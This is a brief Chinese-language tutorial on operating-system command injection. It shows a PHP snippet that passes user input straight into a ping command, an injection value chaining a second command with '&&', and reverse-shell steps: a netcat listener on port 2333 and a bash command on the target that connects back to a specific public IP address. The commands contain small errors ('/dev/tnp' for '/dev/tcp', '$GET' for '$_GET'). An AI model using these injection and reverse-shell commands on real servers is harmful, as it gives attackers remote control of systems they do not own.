## ExecuteAttack 系统命令注入攻击

### 系统命令注入

我们都知道, 在linux系统中可以利用连接符或者管道去串联两个系统命令.

系统命令注入攻击在服务器端一般以如下形式呈现:

```php
<?php
system('ping -c' . $GET['ip']);
?>
```

我们可以注入

```shell
127.0.0.1 && payload
```

诸如此类的完成劫持.



### 利用系统命令实现shell反弹

我们将用户机设为劫持机, 服务端设为靶机.

我们查看攻击机的公网IP.

```shell
curl ifconfig.me
```

将攻击机的监听端口挂载至2333:

```shell
netcat -lvvp 2333
```

接着在靶机操作:

```shell
bash -c "bash -i >& /dev/tnp/211.64.159.164/2333 0>&1"
```

